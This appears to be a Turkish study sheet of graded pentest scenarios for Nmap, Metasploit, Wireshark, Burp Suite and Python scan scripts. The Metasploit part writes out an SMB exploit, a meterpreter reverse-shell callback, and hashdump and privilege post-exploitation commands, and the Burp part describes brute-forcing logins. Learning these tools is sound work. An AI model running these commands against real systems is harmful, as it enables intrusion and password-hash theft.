1. Nmap ile Ağ ve Güvenlik Taraması - Senaryolar

Kolay (Senaryo: Ofis Cihazları Tespiti)

Ofisiniz ağındaki hangi cihazların aktif olduğunu ve IP adreslerini öğrenin.

nmap -sn 192.168.1.0/24

Orta (Senaryo: Web Sunucusu Port ve Servis Taraması)

Şirket ağına bağlı web sunucusundaki aktif portları ve çalışan servisleri detaylı inceleyin.

nmap -sV -p 22,80,443 192.168.1.10

Açıklama: Port 22 (SSH), 80 (HTTP) ve 443 (HTTPS) üzerinde çalışan servislerin versiyonlarını öğrenip potansiyel açıklıklara karşı araştırma yapabilirsiniz.

Zor (Senaryo: Güvenlik Duvarı Bypass ve Script Tarama)

Hedef sistemde güvenlik duvarı var ve çeşitli güvenlik açıklarını otomatik scriptlerle sorgulamak istiyorsunuz.

nmap -sS -sC -sV 192.168.1.10

Açıklama: SYN taraması (-sS) ile gizli tarama yapılır, script taraması (-sC) temek güvenlik testleri uygular ve servis versiyonu (-sV) bilgisi verir.

Uzman (Senaryo: Ağ Haritalaması ve Derinlemesine Güvenlik Analizi)

Ağdaki tüm cihazları haritalayın, OS tespiti yapın, güvenlik açıklarını derinlemesine tarayın.

nmap -A -p- 192.168.1.0/24

Açıklama: Tüm portlar (-p-), detaylı OS ve servis tespiti (-A) ile geniş kapsamlı tarama yapılır.

2. Metasploit ile Sızma Testi - Senaryolar

Kolay (Senaryo: Basit SMB Exploit)

Bilinen SMB açığını kullanarak hedef sisteme sızmayı deneyin.

msfconsole use exploit/windows/smb/ms08_067_netapi set RHOST 192.168.1.105 run

Orta (Senaryo: Meterpreter Ters Bağlantı Kurma)

Hedefte meterpreter shell açmak için bağlantı bilgilerini ayarlayın.

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.100 exploit

Zor (Senaryo: Multi-handler ile Çoklu Bağlantı Yönetimi)

Birden fazla meterpreter bağlantısını yakalayarak yönetin.

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.100 exploit

Uzman (Senaryo: Post-Exploit Bilgi Toplama)

Ele geçirilen sistemde parola hashlerine ve yönetici yetkilerine erişim için modüller çalıştırın.

run post/windows/gather/hashdump run post/windows/manage/priv

3. Wireshark ile Ağ Trafik Analizi - Senaryolar

Kolay (Senaryo: Temel Paket Yakalama)

Ağ arayüzünüzden geçen tüm paketleri yakalayın ve analiz etmeye başlayın.

wireshark

Orta (Senaryo: HTTP Trafik Filtreleme ve İnceleme)

[Wireshark](pplx://action/translate) içindeki HTTP isteklerini filtreleyerek kullanıcı aktivitelerini analiz edin. Gerçek dünyada web uygulamalarında potansiyel SQL enjeksiyon ve XSS tespiti için trafik kayıtlarını inceleyin.

http && ip.addr == 192.168.1.100

Açıklama: Bu filtre belirli bir IP adresi ile yapılan tüm HTTP trafiğini gösterir. Trafikteki GET/POST isteklerini inceleyerek saldırı işaretleri arayabilirsiniz.

Zor (Senaryo: TCP Üç Yönlü El Sıkışma İzleme)

Bir TCP bağlantısının kurulma aşamasındaki SYN/ACK paketlerini takip ederek bağlantı sorunlarını analiz edin.

tcp.flags.syn==1 and tcp.flags.ack==0

Uzman (Senaryo: Yeniden Gönderim ve Ağ Performans Sorunları)

Ağda gecikme ve paket kaybını tespit etmek için yeniden gönderilen paketleri filtreleyin ve analiz edin.

tcp.analysis.retransmission

4. Burp Suite ile Web Uygulama Güvenliği - Senaryolar

Kolay (Senaryo: Proxy ile Manuel HTTP Trafiği Yakalama)

Tarayıcınız ile web uygulaması arasındaki tüm HTTP(S) trafiğini yakalayarak inceleyin.

Proxy > Intercept > On

Orta (Senaryo: Otomatik Güvenlik Tarayıcı Kullanımı)

Burp Suite'in aktif tarama özelliği ile web uygulamasındaki yaygın güvenlik açıklarını tespit edin. 

Scanner > Active Scan

Zor (Senaryo: Brute Force Saldırısı ve Parametre Testi)

Intruder modülünü kullanarak giriş formuna kelime listesiyle saldırı uygulayın.

Intruder > Positions: parametre seç > Payloads: kelime listesi ile deneme

Uzman (Senaryo: Kendi Eklentinizi Yazma ve Testleri Otomatikleştirme)

Burp Suite için Java tabanlı özel eklenti geliştirin ve test süreçlerinizi otomatikleştirin.

5. Python ile Otomasyon - Senaryolar

Kolay (Senaryo: Basit Nmap Tarama Komutu)

odede>import os os.system("nmap -sn 192.168.1.0/24")

Orta (Senaryo: Fonksiyon Tanımlama ve Tek IP Tarama)

import os def nmap_tarama(ip): os.system(f"nmap -sV {ip}") nmap_tarama("192.168.1.50")

Zor (Senaryo: Çoklu IP Tarama Döngüsü)

import os ips = ["192.168.1.50", "192.168.1.51", "192.168.1.52"] for ip in ips: nmap_tarama(ip)

Uzman (Senaryo: Tarama Sonuçlarını Dosyaya Kaydetme)

import os def nmap_kaydet(ip, dosya): os.system(f"nmap -sV {ip} -oN {dosya}") nmap_kaydet("192.168.1.50", "scan_result.txt")
